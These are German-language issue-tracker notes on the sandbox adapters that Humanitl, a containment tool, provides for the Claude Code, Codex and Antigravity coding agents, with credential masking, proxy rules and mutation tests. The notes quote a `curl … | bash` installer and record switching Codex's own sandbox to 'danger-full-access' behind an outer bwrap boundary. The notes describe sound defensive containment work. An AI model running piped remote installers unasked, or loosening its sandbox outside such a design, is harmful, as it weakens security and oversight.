  `llm.endpoint` (außer `api.anthropic.com`) `ANTHROPIC_BASE_URL` (ohne
  Zugangsdaten, Query und `/v1`, Loopback über den Alias-Namen),
  `ANTHROPIC_AUTH_TOKEN` statt `ANTHROPIC_API_KEY` und das erste Modell aus
  `llm.models` als `ANTHROPIC_MODEL`. Die Sitzungsliste zeigt das Programm
  hinter dem Starter (`agent::shown_program`).
- Durchreiche: `api.anthropic.com:443` ohne `llm.endpoint`, sonst das
  Gateway, jeweils nur `POST` auf `/v1/messages` und
  `/v1/messages/count_tokens` (llm-gateway-protocol, „API formats").
  Maske und Fund: der Schlüssel gehört zum Inferenz-Endpunkt des Adapters
  und zu der Kopfzeile, die der Adapter nennt (`AgentAdapter::key_header`,
  Vorgabe `authorization`, Claude Code ohne Gateway `x-api-key`); beides
  trägt die Maske (`SecretMasks::add_for_header`, `expected_in`,
  `Recorder::mask_secret_in`). So bleibt etwa der Schlüssel von `OpenCode`
  in `X-Api-Key` ein Fund. `session.rs` fragt den Adapter nach der
  Durchreiche auch ohne `llm.endpoint`.
- Direkt ist nur die Anthropic-API selbst (`is_direct_api`: `https`, Host
  `api.anthropic.com`, Port 443, Pfad leer oder `/v1`, ohne Zugangsdaten,
  Query, Fragment); jeder andere Endpunkt, auch derselbe Host mit anderem
  Port oder Pfad, ist ein Gateway mit `ANTHROPIC_BASE_URL` und
  `ANTHROPIC_AUTH_TOKEN`. Umgebung, Starter, Durchreiche, Briefing, Hinweis
  und Maske lesen denselben aufgelösten Endpunkt (`resolved_endpoint`).
- Briefing unter Linux als verwaltete `/etc/claude-code/CLAUDE.md`, Skill
  `humanitl` als Enterprise-Skill `/etc/claude-code/.claude/skills/`
  (memory, skills); beide gelten auch im Depot. Unter macOS
  `~/.claude/CLAUDE.md` und ein persönlicher Skill. Dazu ein Satz, dass die
  eigene Sandbox von Claude Code bleibt und die äußere Grenze Humanitl ist.
- Hinweis HUM-516: `inference_endpoint` nennt `api.anthropic.com` ohne
  `llm.endpoint`.
- Depot: `command_keys` nach dem Index der settings-reference ergänzt
  (`awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`,
  `otelHeadersHelper`, `fileSuggestion`, `processWrapper`, `policyHelper`,
  `sshHostCommands`).
- Docs: SECURITY (Fund), THREAT-MODEL K-02 und Gefahrenzeile Zugangsdaten
  (en, de), README-Liste der Agenten.

Tests: `daemon/crates/sandbox/tests/claude_adapter.rs` (Register, Kommando,
Env-Kit, Gateway, Starter, Dateien, Durchreiche, Hinweis, Vorprüfung,
Rezept, und im echten bwrap ein Stellvertreter hinter dem Starter neben
einem gefälschten Host-Home mit `~/.claude/.credentials.json` und
`~/.claude.json`: Schlüssel in der Umgebung, nicht in `argv` oder der
Umgebung des Plans, CA lesbar, Briefing und Skill da, Konfigurationsordner
leer und schreibbar, Markierung des Host-Logins nirgends unter `/home`,
`/etc`, `/tmp`, `/work`, `/run`), Wächter des Depots mit dem Starter
(`depot/tests.rs`), `ipc` (Schlüssel als Datei und über den Starter, Maske
an `api.anthropic.com:443`; keine Shell des Aufrufers bekommt den Starter),
`proxy::findings` (`X-Api-Key` nur am eigenen Ziel), Widget-Test der Wahl in
den Einstellungen; Katalog (`catalog/*.toml`, erzeugter Katalog der App) mit
dem Titel „Claude Code". Mutationsbeweise, jeder rot: Host-Login als Datei in den
Konfigurationsordner kopiert, `NODE_EXTRA_CA_CERTS` entfernt, Schlüssel als
`ANTHROPIC_API_KEY` in der Umgebung des Plans, Starter weggelassen,
Maske nach `llm.endpoint` statt nach dem Inferenz-Endpunkt, Direktprüfung
nur am Host (Sandbox- und ipc-Test rot), Maske ohne Vergleich der Kopfzeile
(core- und proxy-Test rot), Fund nur in `authorization` freigestellt
(proxy-Test rot).

Abweichungen und offen:
- **Nur die Messages-Endpunkte in der Durchreiche**, nicht der ganze Host
  `api.anthropic.com`: so bleibt K-02 („genaue Inferenz-Endpunkte") wahr.
  Feature-Flags und Telemetrie schaltet
  `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` ab; die Domain-Prüfung von
  WebFetch und jeder andere Pfad werden gehalten wie jede Anfrage.
  Mitgelieferte Regeln sind eine Datei für alle Adapter
  (`rules/default.yaml`); eine Freigabe des ganzen Hosts dort gälte auch für
  `OpenCode` und pi.
- **Kein „persistent je Projekt" unter `$XDG_DATA_HOME/humanitl`** für den
  Host-Fall (Punkt 4): Ein Adapter kann keine Einhängung des Hosts
  beitragen (Zusage 1 des Moduls), und ein schreibbarer Ordner, der Sitzungen
  überdauert, wäre ein Weg, `hooks` oder `apiKeyHelper` in die nächste
  Sitzung zu tragen. Der Ordner ist je Sitzung frisch; wer Bestand will,
  nimmt das Depot, dessen Konfigurationslauf Schlüssel mit Befehlen
  hervorhebt. Kandidat für ein eigenes Issue, falls gewünscht.
- **Zugangsdatei und Anmeldelauf nicht erklärt**: Die Doku nennt für
  `.credentials.json` nur Ort und Modus `0600`, keinen Schlüssel; damit
  bleiben `credential_format` und `login_run` `None`, und `agents login
  claude` antwortet weiter `AGENT_014`. Was zu messen ist, steht in
  HUM-553 Punkt 3.
- **Kein Ende-zu-Ende-Lauf mit dem echten `claude` in der CI**: Es dürfte
  hier nicht installiert und lokal nicht geprüft werden, ein ungeprüfter
  CI-Job gegen ein schnell wechselndes Fremdprogramm mit einem
  Stellvertreter, der die SSE-Antworten der Messages-API nachbaut, wäre ein
  Tor, das ohne eigene Probe rot werden kann. Belegt ist der Weg mit dem
  Stellvertreter-Programm im echten bwrap; der echte Lauf steht in HUM-553.
  Kandidat für ein eigenes Issue: CI-Job `claude-e2e` mit `npm install -g
  @anthropic-ai/claude-code` und `claude -p` gegen einen Stellvertreter
  hinter `ANTHROPIC_BASE_URL`, ohne echten Schlüssel.
- Ein Aufrufer, der in einer Shell (`humanitl run -- bash`) `claude` von Hand
  startet, bekommt den Schlüssel nicht in die Umgebung (nur die Datei);
  der Starter gilt nur dem Agenten selbst.
- Mit Schlüssel startet der Shim `/bin/sh`, nicht `claude`: Fehlt das
  Programm doch, endet die Shell mit 127 und ihrer eigenen Meldung, und
  `AGENT_005` (HUM-137) erkennt den Fehlstart nicht; die Vorprüfung
  (`AGENT_001`) fängt den Fall vor dem Start. Dasselbe gilt schon für den
  Starter von `OpenCode` unter macOS.
- Unter macOS nicht gegengeprüft (weder Lauf noch Übersetzung für
  `aarch64-apple-darwin`): Briefing und Skill unter `~/.claude`.

---

## HUM-515 · Agent-Adapter Codex

### Kontext
Wie HUM-514, für die Codex CLI von OpenAI. Angaben geprüft am 2026-11-16 an
der offiziellen Dokumentation (learn.chatgpt.com/docs/config-file/
config-reference und /environment-variables, früher
developers.openai.com/codex); vor dem Bau erneut prüfen.

### Spezifikation
1. Adapter nach HUM-037 wie HUM-514, aus denselben Bausteinen (kein
   kopierter Adapter).
2. **CA:** `CODEX_CA_CERTIFICATE` auf die CA der Sandbox (Vorrang vor
   `SSL_CERT_FILE`, das die Doku als Rückfall nennt). Wie Codex einen
   HTTP-Proxy liest (`HTTPS_PROXY`), steht nicht auf diesen Seiten: vor dem
   Bau an der Doku oder am Quelltext (github.com/openai/codex) belegen.
3. **Eigene Sandbox von Codex:** `sandbox_mode` kennt `read-only`,
   `workspace-write` und `danger-full-access`. Ob seine Linux-Sandbox in
   unserer bwrap-Sandbox startet (verschachtelte Namensräume, seccomp), ist
   zu prüfen; startet sie nicht, setzt der Adapter `danger-full-access`,
   weil Humanitl die äußere Grenze ist, und das Briefing sagt es. Diese Wahl
   steht im Issue-Status mit Beleg.
4. **Zustand und Zugangsdaten:** `CODEX_HOME` auf einen Ordner in der
   Sandbox (Vorgabe von Codex `~/.codex`, der des Hosts wird nicht
   eingebunden). API-Schlüssel aus dem Schlüsselbund; für einen
   nicht-interaktiven Lauf nennt die Doku `CODEX_API_KEY`, für einen
   Anbieter die Variable aus `model_providers.<id>.env_key`.
   `cli_auth_credentials_store = "ephemeral"` oder `"file"` im
   Sandbox-Ordner, nie der Schlüsselbund des Hosts.
5. **Nebenverkehr aus:** `check_for_update_on_startup = false`,
   `analytics.enabled = false`, `feedback.enabled = false` in der
   `config.toml` unter `CODEX_HOME`.
6. Eigener Endpunkt über `model_providers.<id>.base_url` bzw.
   `openai_base_url`, wenn `llm.endpoint` gesetzt ist.
7. Hinweis auf die Inferenz aus HUM-516.

### Agent-Depot (ADR-0023, Nachtrag 2026-11-16)
Mit `agents.codex.source = "depot"` kommt `codex` aus dem Depot
(HUM-518 bis HUM-520). Depot-Angaben des Adapters: Installation als
natives Release-Artefakt (Hosts vor dem Bau belegen), `CODEX_HOME` auf die
Kopie von `config/`, `cli_auth_credentials_store = "file"`, Zugangsdatei
`auth.json` mit Format und Kontoabgleich (`chatgpt_account_id` aus dem
`id_token`, nur gelesen, nicht geprüft), Anmeldung über
`codex login --device-auth` und als Rückfall das Einfügen der Callback-URL
(learn.chatgpt.com/docs/auth: Callback auf `localhost:1455`, den die
Sandbox nicht empfängt; unter Seatbelt auf macOS nur der Geräte-Fluss,
HUM-520 Punkt 2). Rotierende Refresh-Tokens: siehe Fallstricke von
HUM-520.
Das Rezept nennt die Orte einer Host-Installation (globales npm unter
`/usr/lib/node_modules`, `/usr/bin`, `/usr/local/bin`; vor dem Bau belegen),
die der Launcher bei `depot` maskiert (HUM-518 Punkt 4).

### Tests
- Adapter-Tests (Env-Kit, `config.toml` unter `CODEX_HOME`).
- Ende-zu-Ende-Lauf wie in HUM-514 mit Stellvertreter-Endpunkt.
- Nichts aus `~/.codex` des Hosts ist in der Sandbox sichtbar.
- Mutationen: Host-`CODEX_HOME`, CA fehlt, Update-Prüfung an.

### Akzeptanzkriterien
1. `humanitl go` mit Codex führt bis zu dessen Prompt in der
   Wegwerf-Sitzung.
2. Die Anmeldedaten des Hosts erreichen die Sandbox nicht.

### Stand nach der Umsetzung (2026-11-20)

Gebaut: `daemon/crates/sandbox/src/agent/codex.rs` (`CodexAdapter`, vierter
Eintrag im Register, `agent.adapter = "codex"`, auch in Katalog und App), aus
den Bausteinen von HUM-514 (Starter mit memfd-Datei, aufgelöster Endpunkt für
Umgebung, Durchreiche, Briefing, Hinweis und Maske, `command_preflight`, kein
kopierter Adapter). Quellen, gelesen 2026-11-20: learn.chatgpt.com
(`/docs/config-file/config-reference`, `/docs/config-file/environment-variables`,
`/docs/auth`, `/docs/enterprise/managed-configuration`, `/docs/build-skills`,
`/docs/agent-configuration/agents-md`, `/docs/sandboxing`) und
github.com/openai/codex, Commit `a0a30c40e8dbcc44af52e2df64dcce64368d4422`;
jede Angabe steht mit Adresse bzw. Datei im Code. Nichts ist am echten
`codex` gemessen.

- Programm: `sudo npm install -g --ignore-scripts @openai/codex` (`README.md`
  des Repos); `bin/codex.js` ist ein Node-Starter vor dem Binary eines
  Plattform-Pakets (`codex-cli/bin/codex.js`), also kein natives Programm
  (`is_native_program = false` wie pi). Orte einer Host-Installation im
  Rezept: `{prefix}/lib/node_modules` und `{prefix}/bin` mit `prefix` dort, wo
  node liegt (docs.npmjs.com/cli/v11/configuring-npm/folders).
- Proxy: `HTTPS_PROXY`/`ALL_PROXY`/`NO_PROXY` aus der Umgebung, wenn die
  Plattform keinen System-Proxy meldet (unter Linux nie), sonst reqwests
  Vorgabe mit denselben Variablen
  (`codex-rs/http-client/src/outbound_proxy.rs`, `resolve_env_proxy_route`).
  Kommt aus dem Env-Kit wie bei jedem Agenten.
- CA: `CODEX_CA_CERTIFICATE` auf die CA der Sandbox (environment-variables:
  Vorrang vor `SSL_CERT_FILE`, gilt für HTTPS, Anmeldung, WebSocket); Codex
  hängt sie an die nativen Wurzeln an (`codex-rs/http-client/src/custom_ca.rs`).
- Zustand: `CODEX_HOME=<home>/.codex` auf dem tmpfs-Home („must already
  exist": die `config.toml` des Adapters legt den Ordner an); im Depot setzt
  das Rezept ihn auf die Kopie, und dieser Wert gewinnt.
- `config.toml` unter `CODEX_HOME` (nur lesbar): `check_for_update_on_startup
  = false`, `analytics.enabled = false`, `feedback.enabled = false`,
  `cli_auth_credentials_store = "file"` (im tmpfs, nie der Schlüsselbund des
  Hosts), `sandbox_mode = "danger-full-access"`, `projects."/work".trust_level
  = "untrusted"` (keine Frage nach Vertrauen, die in die nur lesbare Datei
  schreiben wollte; Hooks und Regeln aus `.codex/` des Projekts laufen nicht
  ungefragt). Unter Linux erzwingt `/etc/codex/requirements.toml`
  (managed-configuration) Update-Prüfung aus, Ablage `file` und Feedback aus
  auch in einer Depot-Sitzung, deren `CODEX_HOME` die Kopie ist.
- Anbieter und Schlüssel: Mit Schlüssel (`llm.api_key_ref`) oder
  `llm.endpoint` erklärt der Adapter einen eigenen Anbieter `humanitl`
  (`model_provider`, `model_providers.humanitl.base_url`, `wire_api =
  "responses"`, mit Schlüssel `env_key = "OPENAI_API_KEY"`, erstes Modell aus
  `llm.models`). Ein eigener Anbieter hat `requires_openai_auth = false`
  (kein Anmeldebildschirm, Schlüssel aus `env_key`) und `supports_websockets
  = false` (`codex-rs/model-provider-info/src/lib.rs`); der Schlüssel geht
  als `Authorization: Bearer` (`codex-rs/model-provider/src/auth.rs`), also
  in die Vorgabe-Kopfzeile der Maske. Der Starter (`codex::KEY_START`) liest
  `/etc/humanitl/codex/llm-api-key` und exportiert `OPENAI_API_KEY`; der
  Schlüssel steht in keinem `argv` und keiner Variable des Plans.
  `CODEX_API_KEY` der Doku gilt nur für `exec` und SDK, deshalb `env_key`.
  Ohne Schlüssel und Endpunkt bleibt der eingebaute Anbieter mit
  `ChatGPT`-Anmeldung; seine Inferenz geht an
  `https://chatgpt.com/backend-api/codex` (`to_api_provider`).
- Durchreiche: `POST` und `GET` genau auf `<basis>/responses` und
  `<basis>/models` (`codex-rs/codex-api`: `RESPONSES_PATH`,
  `endpoint/models.rs`), als eine Regel: Ein Adapter gibt genau eine
  Durchreichregel (`AgentAdapter::llm_passthrough`, feste Id), deren Matcher
  Methode und Pfad nicht paart, und der eingebaute Anbieter braucht `GET
  <basis>/responses` für sein WebSocket-Upgrade
  (`codex-api/src/endpoint/responses_websocket/connector.rs`). `POST
  /models` und für den eigenen Anbieter `GET /responses` gehen deshalb mit
  durch, an dieselbe Origin wie die Inferenz (Review, teilweise übernommen;
  Kandidat für ein eigenes Issue: Durchreiche mit Methode je Pfad); Basis `https://api.openai.com/v1` mit Schlüssel, die
  OpenAI-Fläche von `llm.endpoint` (`…/v1`, Loopback über den Alias-Namen)
  oder die `ChatGPT`-Basis. Hinweis HUM-516 nennt den aufgelösten Anbieter
  (`api.openai.com`, `chatgpt.com`, keinen für einen lokalen Endpunkt).
- **`sandbox_mode = "danger-full-access"`, mit Beleg:** Die Linux-Sandbox von
  Codex ist bubblewrap mit `--unshare-user`
  (`codex-rs/linux-sandbox/README.md`, „Current Behavior"; die Doku
  `/docs/sandboxing`: Codex nimmt das erste `bwrap` im `PATH`). Humanitl
  startet jede Sitzung mit `--disable-userns`. Messung am 2026-11-20 mit
  bubblewrap 0.13.1 als Stellvertreter: `bwrap --unshare-user …` innerhalb
  von `bwrap --disable-userns --cap-drop ALL …` endet mit „Creating new
  namespace failed: nesting depth or /proc/sys/user/max_*_namespaces
  exceeded (ENOSPC)", ohne `--disable-userns` läuft dasselbe. Der Test im
  echten Sandbox-Lauf belegt es bei jedem Lauf (`unshare --user true` wird
  abgelehnt, `nested_userns=refused`). `allowed_sandbox_modes` muss
  `read-only` enthalten (`codex-rs/config/src/config_requirements.rs`), ein
  Erzwingen über die Anforderungen geht also nicht; der Wert steht in der
  `config.toml`, und das Briefing sagt, dass die äußere Grenze Humanitl ist.
- Briefing unter Linux als `additional_developer_instructions` in
  `/etc/codex/requirements.toml` (config-reference: „Managed developer
  instructions"; alle vier Schlüssel der Datei sind Felder von
  `ConfigRequirementsToml` in `codex-rs/config/src/config_requirements.rs`), Skill als Admin-Skill `/etc/codex/skills/humanitl/SKILL.md`
  (build-skills); beide gelten auch im Depot. Unter macOS `AGENTS.md` in
  `CODEX_HOME` (agents-md) und ein Nutzer-Skill unter `~/.agents/skills`.
- Depot (`depot/recipe.rs`, `CODEX_RECIPE`): `config_env = "CODEX_HOME"`,
  Zugangsdatei `auth.json`, Format `CODEX_AUTH_JSON` aus dem Quelltext
  (`AuthDotJson` in `codex-rs/login/src/auth/storage.rs`, `TokenData` in
  `codex-rs/login/src/token_data.rs`): `OPENAI_API_KEY` und
  `tokens.account_id` immer geschrieben, nach einer Anmeldung ohne
  Schlüssel `null` (neue Formen `TokenOrNull`, `TextOrNull` im Wächter);
  `last_refresh` ist RFC 3339, der Ablauf steht im JWT, also kein `Expiry`
  (der Wächter nimmt dann nur aus einer Sitzung zurück, die auf der
  gespeicherten Datei begann); Konto `tokens.account_id`, das die Anmeldung
  aus dem Claim `chatgpt_account_id` des `id_token` kopiert
  (`codex-rs/login/src/server.rs`), der JWT selbst wird nicht gelesen.
  Nach dem Review: Wo das Objekt mit dem Konto steht (`tokens`), muss das
  Konto ein nicht leerer Text sein, sonst lehnt der Wächter die Datei ab,
  auch bei der Anmeldung; zwei Dateien ohne benanntes Konto gelten nie als
  dasselbe Konto (vorher war `null` gleich `null`, und eine Sitzung hätte
  Tokens eines anderen Kontos einsetzen können; K-36). Eine Anmeldung, deren
  `id_token` kein `chatgpt_account_id` trägt, scheitert damit geschlossen.
  Neues Feld `CredentialFormat::one_of`: für Codex muss
  `OPENAI_API_KEY` oder `tokens` einen Wert tragen, `{"OPENAI_API_KEY":
  null}` ist keine Anmeldung. Eine Datei nur mit API-Schlüssel nennt kein
  Konto und wird daher nie aus einer Sitzung zurückgeschrieben.
  Nach dem Delta-Review: `auth_mode` nur `apikey` oder `chatgpt` (neue Form
  `ValueForm::OneOf`; die beiden Arten, die Codex' eigene Anmeldungen
  speichern, `AuthMode` in `codex-rs/protocol/src/auth.rs` mit
  `rename_all = "lowercase"`; `headers` lehnt der Lader ab, die übrigen
  gehören zu anderen Quellen), `chatgpt` verlangt `tokens`, `apikey`
  verlangt `OPENAI_API_KEY` (neues Feld `CredentialFormat::requires`, wie
  `CodexAuth::from_auth_dot_json` in `codex-rs/login/src/auth/manager.rs`),
  und eine spätere Rückschrift behält `auth_mode` der gespeicherten Datei
  (neues Feld `CredentialFormat::fixed`; die Erneuerung `persist_tokens`
  lehnt jede andere Art als `chatgpt` ab und lässt `auth_mode` stehen).
  `agent_identity`, `personal_access_token` und Bedrock-Felder gehören zu
  anderen Anmeldearten und werden abgelehnt. Anmeldelauf `codex login
  --device-auth` gegen `auth.openai.com` (`DEFAULT_ISSUER`, `deviceauth/*`,
  Bestätigungs-URL `<issuer>/codex/device`), Einstellung des Geräte-Flusses
  aus `/docs/auth` als `device_flow_setting`. Schlüssel mit Befehlen:
  `notify`, `mcp_servers`, `model_providers`, `hooks`, `desktop`,
  `shell_environment_policy`, `profiles`.

Tests: `daemon/crates/sandbox/tests/codex_adapter.rs` (Register, Kommando,
Env-Kit, `CODEX_HOME` nach dem Home der Sandbox, `config.toml`, Anbieter nach
Schlüssel und Endpunkt, Anforderungen samt Briefing, Starter, Dateien,
Durchreiche, Hinweis, Vorprüfung, Rezept, und im echten bwrap ein
Stellvertreter hinter dem Starter neben einem gefälschten Host-Home mit
`~/.codex/auth.json` und `config.toml`: Schlüssel in der Umgebung, nicht in
`argv` oder der Umgebung des Plans, `config.toml` mit Update-Prüfung aus und
`env_key`, CA lesbar, Anforderungen und Skill da, in `CODEX_HOME` nur die
`config.toml`, Markierung des Host-Logins nirgends unter `/home`, `/etc`,
`/tmp`, `/work`, `/run`, `CODEX_HOME` schreibbar, `config.toml` und
Schlüsseldatei nur lesbar, verschachtelter Nutzer-Namensraum abgelehnt),
`depot/recipe.rs` (Format nimmt die Datei, die die Anmeldung schreibt, auch
mit `null`, lehnt fremde Anmeldearten, fehlende Token und falsche Typen ab),
`ipc` (Schlüssel als Datei und über den Starter, Maske `Authorization` an
`api.openai.com:443`, Durchreiche), Widget-Test der Wahl in den Einstellungen,
Katalog und erzeugter Katalog der App, Widget-Test der Wahl mit fünf
Agenten bei kleinster Fenstergröße (`agent_row_width_test.dart`, en und
de, Linux und macOS). Mutationsbeweise, jeder rot:
Host-`CODEX_HOME` (Wert vom Host-Home), Host-Login als Datei in `CODEX_HOME`
kopiert, `CODEX_CA_CERTIFICATE` entfernt, `check_for_update_on_startup =
true`, Schlüssel als `OPENAI_API_KEY` in der Umgebung des Plans,
`TokenOrNull` wie `Token` geprüft, aufgelöste Basis ohne Schlüsselbezug
(Maske an `chatgpt.com`, ipc-Test rot), Kontovergleich mit `None` gleich
`None`, Pflicht des benannten Kontos entfernt, `one_of` entfernt, `OneOf`
nimmt jeden Text, `requires` entfernt, `fixed` entfernt, dreimal so lange
Beschriftung für Codex (Überlauf der Zeile). Angepasst: drei Tests, die `codex`
als Agenten ohne Rezept nahmen, nehmen jetzt `agy`; die Registerlisten in
`opencode_adapter.rs` und `pi_adapter.rs`.

Abweichungen und offen:
- **Kein Installationsrezept fürs Depot** (`install: None`, `agents install
  codex` antwortet `AGENT_015`; Review Codex „blocking", nicht übernommen:
  Akzeptanzkriterium 1 gilt mit einer Host-Installation, das Depot für ein
  Paket aus mehreren Dateien wird HUM-566): Das Paket des Herstellers
  (`codex-package-<target>.tar.gz`, `scripts/install/install.sh`) trägt
  `bin/codex` neben `bin/codex-code-mode-host`, `codex-path/rg` und
  `codex-resources/bwrap`, und der Installer startet es über einen Verweis
  `codex -> bin/codex`; das Depot startet `program/<version>/<program>` und
  nimmt dort nur eine reguläre Datei. Ob `codex` außerhalb von `bin/` neben
  seinen Helfern läuft, ist weder dokumentiert noch gemessen; die
  Integrität ist eine SHA-256-Liste aus demselben Release, keine Signatur.
  Messpunkt in HUM-553 Punkt 4. Kandidat für ein eigenes Issue:
  Installationsrezept für Codex, gegebenenfalls mit einem Depot, das ein
  Programm über einen Verweis im Baum starten darf.
- **Kein Rückfall mit eingefügter Callback-URL** (`callback: None`): Der
  Anmeldelauf ist der Geräte-Fluss, der keinen Listener öffnet. Der
  Browser-Fluss von `codex login` leitet laut Quelltext auf
  `http://127.0.0.1:<port>/auth/callback` um (`codex-rs/login/src/server.rs`),
  nicht auf `localhost` wie in der Doku; `login_url.rs` nimmt nur
  `http://localhost:…`. Kandidat für ein eigenes Issue: Anmeldelauf mit
  Browser-Fluss als Rückfall, mit der Adresse aus dem Quelltext.
- **Depot-Sitzung ohne `sandbox_mode` und `analytics`:** Beide stehen nur in
  der `config.toml` einer Host-Sitzung; in einer Depot-Sitzung gilt die
  `config.toml` der Kopie, und keine Anforderung erzwingt
  `danger-full-access` (siehe oben) oder `analytics` (kein Schlüssel der
  Anforderungen). Statsig wird dann gehalten wie jede Anfrage; eine
  Depot-Sitzung mit Codex' eigener Sandbox scheitert bei jedem Befehl, bis
  der Konfigurationslauf `sandbox_mode` setzt. Ohne Installationsrezept
  gibt es noch keine Depot-Sitzung. Kandidat für ein eigenes Issue:
  Vorgaben eines Adapters in die Konfigurationskopie einer Depot-Sitzung.
- **`ChatGPT`-Anmeldung in einer Host-Sitzung:** möglich (Anmeldehost wird
  gehalten, `auth.json` liegt im tmpfs und verschwindet mit der Sitzung),
  aber die Inferenz des eingebauten Anbieters nutzt WebSocket; ob der
  Proxy das Upgrade durchreicht, ist nicht geprüft (HUM-553 Punkt 4).
- Kein Ende-zu-Ende-Lauf gegen einen Stellvertreter-Endpunkt mit dem echten
  `codex` und keiner mit einem Stellvertreter-Endpunkt hinter dem Proxy:
  wie HUM-514 ist der Weg mit dem Stellvertreter-Programm im echten bwrap
  belegt; der echte Lauf steht in HUM-553 Punkt 4. Kandidat wie in HUM-514:
  CI-Job mit `npm install -g @openai/codex` und `codex exec` gegen einen
  Stellvertreter.
- Wie bei Claude Code startet der Shim mit Schlüssel `/bin/sh`, nicht
  `codex`: Ein fehlendes Programm endet mit 127 der Shell; die Vorprüfung
  (`AGENT_001`) fängt den Fall vorher.
- Unter macOS nicht gegengeprüft: `AGENTS.md` in `CODEX_HOME` und Skill
  unter `~/.agents/skills`, keine Anforderungsdatei.

---

## HUM-517 · Agent-Adapter Antigravity CLI (`agy`, Gemini)

### Kontext
Wunsch des Owners vom 2026-11-16: Gemini über die Antigravity CLI (`agy`)
soll im selben Zug wie Claude Code (HUM-514) und Codex (HUM-515) als Agent
in Humanitl laufen, auch mit `humanitl go`. Der Owner nutzt `agy` schon als
Werkzeug neben Claude Code.

### Spezifikation
1. Adapter nach HUM-037 aus denselben Bausteinen wie HUM-514 und HUM-515
   (Erkennung des Programms, Profil, Standardregeln, Env-Kit, Briefing),
   kein kopierter Adapter.
2. Vor dem Bau an der offiziellen Dokumentation von Antigravity bzw. am
   Quelltext belegen und im Code verlinken: wie `agy` einen HTTP-Proxy und
   eine zusätzliche CA liest, wo Zustand und Anmeldung liegen und wie man
   sie auf einen Ordner in der Sandbox umlenkt, welche Hosts Modell und
   Anmeldung brauchen, wie Telemetrie und Update-Prüfung abgeschaltet
   werden, ob `agy` eine eigene Sandbox mitbringt und wie sie sich in bwrap
   verhält. Wo die Dokumentation schweigt, steht das im Issue-Status.
3. Zugangsdaten aus dem Schlüsselbund wie `llm.servers`; die Anmeldung des
   Hosts wird nicht eingebunden.
4. Nebenverkehr aus, soweit `agy` das erlaubt.
5. Hinweis auf die Inferenz und orangefarbenes Tag aus HUM-516.

### Agent-Depot (ADR-0023, Nachtrag 2026-11-16)
Mit `agents.agy.source = "depot"` kommt `agy` aus dem Depot (HUM-518 bis
HUM-520). `agy` legt seine Anmeldung laut Doku im Schlüsselbund des Systems
ab (Secret Service über D-Bus, antigravity.google/docs/install, Reiter CLI);
der Session-Bus des Hosts kommt nie in eine Sandbox. Bis belegt ist, ob
`agy` ohne Schlüsselbund in eine Datei schreibt, unterstützt das Depot
`agy` nur mit API-Schlüssel (`modelProvider = "gemini"` in
`antigravity-cli/settings.json` im Depot, `GEMINI_API_KEY` aus dem
Schlüsselbund von Humanitl); `agents login agy` meldet das mit `why` und
`fix`. Das Ergebnis der Prüfung steht im Issue-Status.
Das Rezept nennt die Orte einer Host-Installation (globales npm unter
`/usr/lib/node_modules`, `/usr/bin`, `/usr/local/bin`; vor dem Bau belegen),
die der Launcher bei `depot` maskiert (HUM-518 Punkt 4).

### Tests
- Adapter-Tests wie für HUM-514; Ende-zu-Ende-Lauf mit
  Stellvertreter-Endpunkt, wenn `agy` das zulässt, sonst mit
  Stellvertreter-Programm, das die Umgebung prüft.
- Nichts aus der Anmeldung des Hosts ist in der Sandbox sichtbar.

### Akzeptanzkriterien
1. `humanitl go` mit `agy` führt bis zu dessen Prompt in der
   Wegwerf-Sitzung.
2. Die Anmeldedaten des Hosts erreichen die Sandbox nicht.

### Stand nach der Umsetzung (2026-11-20)

Gebaut: `daemon/crates/sandbox/src/agent/agy.rs` (`AntigravityAdapter`,
fünfter Eintrag im Register, `agent.adapter = "agy"`, auch in Katalog und
App), aus den Bausteinen von HUM-514 und HUM-515 (Starter mit memfd-Datei,
aufgelöster Endpunkt für Umgebung, Durchreiche, Briefing, Hinweis und
Maske, `key_header`, `command_preflight`, kein kopierter Adapter). Quellen,
gelesen 2026-11-20, jede mit Adresse im Code: antigravity.google/docs
(`/install?tab=cli`, `/getting-started?tab=cli`, `/cli/troubleshooting`,
`/cli/reference`, `/settings`, `/sandbox`, `/rules`, `/skills`,
`/enterprise`), das Installationsskript
`https://antigravity.google/cli/install.sh` und die Gemini-API-Referenz
`https://aistudio.google.com/api-reference`. `agy` ist nicht quelloffen;
nichts ist am echten Programm gemessen.

Belegt und umgesetzt:
- Programm: `curl -fsSL https://antigravity.google/cli/install.sh | bash`
  legt ein einzelnes natives Programm unter `~/.local/bin/agy` ab
  (getting-started; das Skript lädt je Plattform einen „flat native build"
  und prüft SHA-512 aus demselben Manifest). Bindung aus `~/.local/bin` wie
  bei Claude Code (HUM-278), `AGENT_001` nennt den Installer.
- Zustand: `~/.gemini/antigravity-cli/settings.json` (install, settings),
  Regeln in `~/.gemini/GEMINI.md` (rules), Skills der CLI in
  `~/.gemini/antigravity-cli/skills/` (skills). Keine Variable verlegt
  `~/.gemini`; der Adapter legt alles ins tmpfs-Home der Sitzung. Briefing
  als `~/.gemini/GEMINI.md`, Skill `humanitl` dort, beide nur lesbar.
- Anmeldung: Tokens „in the OS-native keyring … Linux Secret Service/dbus"
  (install, Reiter CLI), kein Rückfall in eine Datei beschrieben.
  Deshalb nur API-Schlüssel: mit `llm.api_key_ref` steht
  `"modelProvider": "gemini"` in den Einstellungen, `GEMINI_API_KEY` „is
  read only from the environment" (install). Der Schlüssel kommt als
  memfd-Datei `/etc/humanitl/agy/llm-api-key`, der Starter (`agy::KEY_START`)
  liest ihn mit `read` und exportiert ihn; in keinem `argv`, in keiner
  Variable des Plans.
- Einstellungen schreibbar: Die CLI schreibt sie selbst
  (`trustedWorkspaces` „The CLI adds these entries for you", erste
  Einrichtung mit Farbschema und Vertrauen). Der Adapter legt deshalb eine
  nur lesbare Vorlage `/etc/humanitl/agy/settings.json` an, und der
  Starter schreibt sie vor jedem Start nach
  `~/.gemini/antigravity-cli/settings.json`; der Starter steht deshalb
  auch ohne Schlüssel vor dem Agenten. Inhalt: `showFeedbackSurvey =
  false`, mit Schlüssel `modelProvider`, mit Gateway und Modell `model`.
  Vertrauen in `/work` setzt der Adapter nicht; die Frage stellt `agy`.
- Nebenverkehr: `AGY_CLI_DISABLE_AUTO_UPDATE=true` (troubleshooting:
  „native, statically linked self-updater"). Telemetrie hat keinen
  Schlüssel in `settings.json`, „Enable Telemetry" in `/config` ist „saved
  with your account" (cli/reference); mit API-Schlüssel gibt es kein Konto.
  Was `agy` trotzdem sendet, wird gehalten.
- Modell und Hosts: mit Schlüssel „model requests go directly to the
